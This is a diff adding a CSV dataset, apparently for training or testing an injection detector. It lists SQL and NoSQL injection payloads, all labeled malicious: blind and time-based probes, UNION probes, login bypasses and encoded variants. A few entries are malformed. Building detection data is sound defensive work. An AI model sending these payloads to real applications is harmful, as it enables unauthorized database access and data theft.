@@ -1,0 +1,127 @@
+Query,Label
+"' AND (SELECT SUBSTRING(@@version,1,1))='11' --",1
+"' AND (SELECT ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables LIMIT 1)>50 --",1
+admin'--,1
+"' AND (SELECT SUBSTRING(banner,1,1) FROM v$version WHERE rownum=1)='O' --",1
+"{""$where"": ""this.username == this.password""}",1
+"' AND IF((SELECT SUBSTRING(@@version,1,1))='4', SLEEP(4), 0) --",1
+' AND (SELECT COUNT(*) FROM pg_tables)>3 --,1
+"user' UNION SELECT NULL,NULL--",1
+' AND (SELECT COUNT(*) FROM information_schema.tables)>7 --,1
+"' AND IF((SELECT LENGTH(database()))=15, SLEEP(2), 0) --",1
+%27%20AND%201%3D1%20--,1
+%27%20OR%201%3D1%23,1
+"' AND IF((SELECT SUBSTRING(@@version,1,1))='M', WAITFOR DELAY '0:0:3', 0) --",1
+' AND (SELECT LENGTH(current_database()))=15 --,1
+"' AND (SELECT ASCII(SUBSTRING(DB_NAME(),1,1)))>170 --",1
+"' AND (SELECT CASE WHEN (SELECT SUBSTRING(version(),1,1))='P' THEN pg_sleep(14) ELSE pg_sleep(0) END) --",1
+value'#,1
+"' AND IF((SELECT LENGTH(database()))=6, SLEEP(7), 0) --",1
+"' AND (SELECT ASCII(SUBSTRING(DB_NAME(),1,1)))>160 --",1
+"' AND (SELECT SUBSTRING(@@version,1,1))='7' --",1
+"' AND (SELECT CASE WHEN (SELECT SUBSTRING(version(),1,1))='P' THEN pg_sleep(17) ELSE pg_sleep(0) END) --",1
+value'--,1
+' AND (SELECT LEN(DB_NAME()))=5 --,1
+"' AND IF((SELECT LEN(DB_NAME()))=7, WAITFOR DELAY '0:0:3', 0) --",1
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --,1
+CHAR(39) OR CHAR(49)=CHAR(49),1
+"' AND (SELECT CASE WHEN (SELECT SUBSTRING(version(),1,1))='P' THEN pg_sleep(5) ELSE pg_sleep(0) END) --",1
+%27%20UNION%20SELECT%201%2C2%2C3%20--,1
+' AND (SELECT LEN(DB_NAME()))=8 --,1
+' AND (SELECT LENGTH(database()))=5 --,1
+user@example.com' OR '1'='1,1
+"{""$where"": ""this.username.length > 0""}",1
+test'--,1
+' AND (SELECT * FROM (SELECT(SLEEP(9)))a) --,1
+"{""$or"": [{""username"": ""admin""}, {""password"": ""admin""}]}",1
+%u0027 OR 1=1,1
+' AND (SELECT * FROM (SELECT(WAITFOR DELAY '0:0:6'))a) --,1
+%2527%2520AND%25201%253D1%2520--,1
+admin'#,1
+"test' UNION SELECT NULL,NULL--",1
+"' AND (SELECT SUBSTRING(version(),1,1))='P' --",1
+admin' OR '1'='1,1
+' AND (SELECT CASE WHEN (SELECT LENGTH(current_database()))=18 THEN pg_sleep(5) ELSE pg_sleep(0) END) --,1
+test'/*,1
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10 --,1
+user'/**/OR/**/1=1--,1
+name' OR '1'='1'--,1
+test'/**/OR/**/1=1--,1
+"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",1
+value'/**/OR/**/1=1--,1
+"' AND (SELECT SUBSTRING(user(),1,1))='r' --",1
+"' AND (SELECT ASCII(SUBSTRING(current_user,1,1)))>120 --",1
+%2527%2520UNION%2520SELECT%25201%252C2%252C3%2520--,1
+"' AND (SELECT ASCII(SUBSTRING(column_name,1,1)) FROM information_schema.columns LIMIT 1)>100 --",1
+' AND (SELECT COUNT(*) FROM pg_tables)>7 --,1
+%2527%2520OR%25201%253D1%2520--,1
+%2527%2520OR%25201%253D1%2523,1
+' AND (SELECT LENGTH(user) FROM dual)=5 --,1
+"' AND IF((SELECT COUNT(*) FROM information_schema.tables)>9, SLEEP(6), 0) --",1
+"' AND IF((SELECT COUNT(*) FROM information_schema.tables)>20, SLEEP(3), 0) --",1
+"' AND IF((SELECT SUBSTRING(@@version,1,1))='6', SLEEP(6), 0) --",1
+admin'1,1
+user'--,1
+' AND (SELECT * FROM (SELECT(pg_sleep(6)))a) --,1
+' AND (SELECT CASE WHEN (SELECT LENGTH(current_database()))=5 THEN pg_sleep(9) ELSE pg_sleep(0) END) --,1
+' AND (SELECT COUNT(*) FROM pg_tables)>2 --,1
+admin%2527%2520OR%25201%253D1--,1
+' AND (SELECT LEN(DB_NAME()))=9 --,1
+"' AND (SELECT ASCII(SUBSTRING(current_user,1,1)))>200 --",1
+"' AND (SELECT SUBSTRING(database(),1,1))='t' --",1
+admin%27%20OR%201%3D1--,1
+"' AND (SELECT ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables LIMIT 1)>190 --",1
+value'1,1
+"' AND (SELECT SUBSTRING(@@version,1,1))='M' --",1
+"' AND IF((SELECT SUBSTRING(@@version,1,1))='9', SLEEP(9), 0) --",1
+' AND (SELECT COUNT(*) FROM sysobjects)>17 --,1
+"test' UNION SELECT 1,2,3--",1
+user'1,1
+"' AND (SELECT ASCII(SUBSTRING(current_user,1,1)))>190 --",1
+"' AND (SELECT SUBSTRING(@@version,1,1))='15' --",1
+"' AND (SELECT ASCII(SUBSTRING(DB_NAME(),1,1)))>70 --",1
+' AND (SELECT * FROM (SELECT(pg_sleep(15)))a) --,1
+"' AND IF((SELECT SUBSTRING(@@version,1,1))='M', WAITFOR DELAY '0:0:5', 0) --",1
+"' AND IF((SELECT LEN(DB_NAME()))=7, WAITFOR DELAY '0:0:7', 0) --",1
+"user' UNION SELECT 1,2,3--",1
+%2527%2520OR%2520%25271%2527%253D%25271,1
+"{""$gt"": """"}",1
+0x27 OR 0x31=0x31,1
+user'/*,1
+"' AND IF((SELECT COUNT(*) FROM information_schema.tables)>18, SLEEP(4), 0) --",1
+' AND (SELECT LENGTH(user) FROM dual)=9 --,1
+"value' UNION SELECT 1,2,3--",1
+%27%20OR%201%3D1%20--,1
+"' AND (SELECT ASCII(SUBSTRING(column_name,1,1)) FROM information_schema.columns LIMIT 1)>170 --",1
+user' OR '1'='1'--,1
+value'/*,1
+' AND (SELECT LENGTH(database()))=9 --,1
+' AND (SELECT CASE WHEN (SELECT LENGTH(current_database()))=9 THEN pg_sleep(6) ELSE pg_sleep(0) END) --,1
+0x53454C454354,1
+"{""$regex"": "".*""}",1
+test'#,1
+' AND (SELECT * FROM (SELECT(pg_sleep(2)))a) --,1
+"admin' UNION SELECT 1,2,3--",1
+' AND (SELECT * FROM (SELECT(SLEEP(6)))a) --,1
+' AND (SELECT LENGTH(database()))=12 --,1
+user'#,1
+"' AND (SELECT ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables LIMIT 1)>60 --",1
+' AND (SELECT COUNT(*) FROM sysobjects)>9 --,1
+"{""$ne"": null}",1
+' AND (SELECT LENGTH(current_database()))=7 --,1
+"value' UNION SELECT NULL,NULL--",1
+%27%20OR%20%271%27%3D%271,1
+data' OR '1'='1'/*,1
+\u0027 OR 1=1,1
+"' AND IF((SELECT LEN(DB_NAME()))=12, WAITFOR DELAY '0:0:7', 0) --",1
+"admin' UNION SELECT NULL,NULL--",1
+' AND (SELECT COUNT(*) FROM sysobjects)>11 --,1
+admin'/**/OR/**/1=1--,1
+test'1,1
+' AND (SELECT * FROM (SELECT(WAITFOR DELAY '0:0:12'))a) --,1
+admin'/*,1
+"' AND IF((SELECT LENGTH(database()))=8, SLEEP(8), 0) --",1
+"' AND IF((SELECT SUBSTRING(@@version,1,1))='M', WAITFOR DELAY '0:0:4', 0) --",1
+input' OR '1'='1'#,1
+' AND (SELECT COUNT(*) FROM information_schema.tables)>19 --,1
+' AND (SELECT * FROM (SELECT(WAITFOR DELAY '0:0:2'))a) --,1
